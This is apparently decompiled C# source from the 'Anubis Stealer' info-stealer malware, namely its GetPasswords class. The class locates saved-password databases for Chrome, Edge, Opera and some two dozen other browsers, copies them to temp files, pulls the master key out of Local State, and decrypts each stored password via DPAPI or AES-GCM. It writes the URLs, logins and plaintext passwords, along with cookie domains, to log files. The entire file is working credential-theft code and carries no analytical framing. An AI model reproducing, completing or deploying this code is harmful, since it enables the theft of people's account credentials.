// Decompiled with JetBrains decompiler
// Type: Saruman.Stealer.Passwords.GetPasswords
// Assembly: Anubis Stealer, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4CC1199D-65A9-4D34-AA4B-98216B1632A3
// Assembly location: C:\Users\Administrator\Downloads\Build.exe

using Anubis;
using Saruman.Stealer.Cookies;
using Saruman.Utilies.Hardware;

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;

namespace Saruman.Stealer.Passwords
{
    public static class GetPasswords
    {
        public static List<string> profile_list = new List<string>();
        public static List<string> browser_name_list = new List<string>();
        public static List<string> url = new List<string>();
        public static List<string> login = new List<string>();
        public static List<string> password = new List<string>();
        public static List<string> passwors = new List<string>();
        public static List<string> credential = new List<string>();
        private static readonly string bd = Path.GetTempPath() + "\\bd" + Hardware.get_guid() + ".tmp";
        private static readonly string ls = Path.GetTempPath() + "\\ls" + Hardware.get_guid() + ".tmp";
        public static int Cpassword;
        private static readonly string[] BrowsersName = new string[27]
        {
      "Chrome",
      "Edge",
      "Yandex",
      "Orbitum",
      "Opera",
      "Amigo",
      "Torch",
      "Comodo",
      "CentBrowser",
      "Go!",
      "uCozMedia",
      "Rockmelt",
      "Sleipnir",
      "SRWare Iron",
      "Vivaldi",
      "Sputnik",
      "Maxthon",
      "AcWebBrowser",
      "Epic Browser",
      "MapleStudio",
      "BlackHawk",
      "Flock",
      "CoolNovo",
      "Baidu Spark",
      "Titan Browser",
      "Google",
      "browser"
        };

        public static void Passwords_Grab(string profilePath, string browser_name, string profile)
        {
            try
            {
                Path.Combine(profilePath, "Login Data");
                GetPasswords.browser_name_list.Add(browser_name);
                GetPasswords.profile_list.Add(profile);
                List<string> stringList1 = new List<string>();
                string appDate = Browser_Parse.RoamingAppData;
                string localData = Browser_Parse.LocalAppData;
                List<string> stringList2 = new List<string>();
                stringList2.Add(appDate);
                stringList2.Add(localData);
                List<string> stringList3 = new List<string>();
                foreach (string path in stringList2)
                {
                    try
                    {
                        stringList3.AddRange((IEnumerable<string>)Directory.GetDirectories(path));
                    }
                    catch
                    {
                    }
                }
                foreach (string path1 in stringList3)
                {
                    string[] strArray1 = (string[])null;
                    try
                    {
                        stringList1.AddRange((IEnumerable<string>)Directory.GetFiles(path1, "Login Data", SearchOption.AllDirectories));
                        strArray1 = Directory.GetFiles(path1, "Login Data", SearchOption.AllDirectories);
                    }
                    catch
                    {
                    }
                    if (strArray1 != null)
                    {
                        foreach (string path2 in strArray1)
                        {
                            try
                            {
                                if (File.Exists(path2))
                                {
                                    string str1 = "Unknown";
                                    foreach (string str2 in GetPasswords.BrowsersName)
                                    {
                                        if (path1.Contains(str2))
                                            str1 = str2;
                                    }
                                    string sourceFileName1 = path2;
                                    string sourceFileName2 = path2 + "\\..\\..\\Local State";
                                    if (File.Exists(GetPasswords.bd))
                                        File.Delete(GetPasswords.bd);
                                    if (File.Exists(GetPasswords.ls))
                                        File.Delete(GetPasswords.ls);
                                    File.Copy(sourceFileName1, GetPasswords.bd);
                                    string ls = GetPasswords.ls;
                                    File.Copy(sourceFileName2, ls);
                                    SqlHandler sqlHandler = new SqlHandler(GetPasswords.bd);
                                    List<GetPasswords.PassData> passDataList = new List<GetPasswords.PassData>();
                                    sqlHandler.ReadTable("logins");
                                    string str3 = File.ReadAllText(GetPasswords.ls);
                                    string[] strArray2 = Regex.Split(str3, "\"");
                                    int num = 0;
                                    foreach (string str2 in strArray2)
                                    {
                                        if (str2 == "encrypted_key")
                                        {
                                            str3 = strArray2[num + 2];
                                            break;
                                        }
                                        ++num;
                                    }
                                    byte[] key = DecryptAPI.DecryptBrowsers(Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(str3)).Remove(0, 5)));
                                    int rowCount = sqlHandler.GetRowCount();
                                    for (int rowNum = 0; rowNum < rowCount; ++rowNum)
                                    {
                                        try
                                        {
                                            string s = sqlHandler.GetValue(rowNum, 5);
                                            byte[] bytes = Encoding.Default.GetBytes(s);
                                            string str2 = "";
                                            try
                                            {
                                                if (s.StartsWith("v10") || s.StartsWith("v11"))
                                                {
                                                    byte[] array = ((IEnumerable<byte>)bytes).Skip<byte>(3).Take<byte>(12).ToArray<byte>();
                                                    str2 = AesGcm256.Decrypt(((IEnumerable<byte>)bytes).Skip<byte>(15).ToArray<byte>(), key, array);
                                                }
                                                else
                                                    str2 = Encoding.Default.GetString(DecryptAPI.DecryptBrowsers(bytes));
                                            }
                                            catch
                                            {
                                            }
                                            GetPasswords.credential.Add("Site_Url : " + sqlHandler.GetValue(rowNum, 1).Trim() + Environment.NewLine + "Login : " + sqlHandler.GetValue(rowNum, 3).Trim() + Environment.NewLine + "Password : " + str2.Trim() + Environment.NewLine);
                                            ++GetPasswords.Cpassword;
                                        }
                                        catch
                                        {
                                        }
                                    }
                                    foreach (string str2 in GetPasswords.credential)
                                        GetPasswords.password.Add("Browser : " + str1 + Environment.NewLine + "Profile : " + profile + Environment.NewLine + str2);
                                    GetPasswords.credential.Clear();
                                }
                            }
                            catch
                            {
                            }
                        }
                    }
                }
            }
            catch
            {
            }
        }

        public static void Write_Passwords()
        {
            using (StreamWriter streamWriter = new StreamWriter(Program.dir + "\\passwords.log"))
            {
                foreach (string str in GetPasswords.password)
                {
                    streamWriter.Write(str);
                    streamWriter.Write(Environment.NewLine);
                }
                for (int index = 0; index < mozila.passwors.Count<string>(); ++index)
                {
                    streamWriter.Write(mozila.passwors[index]);
                    streamWriter.Write(Environment.NewLine);

                }
            }
            using (StreamWriter streamWriter = new StreamWriter(Program.dir + "\\cookieDomains.log"))
            {
                foreach (string domain in GetCookies.domains)
                {
                    streamWriter.Write(domain);
                    streamWriter.Write(Environment.NewLine);
                }
            }
        }

        private class PassData
        {
            public string Url { get; set; }

            public string Login { get; set; }

            public string Password { get; set; }
        }
    }
}
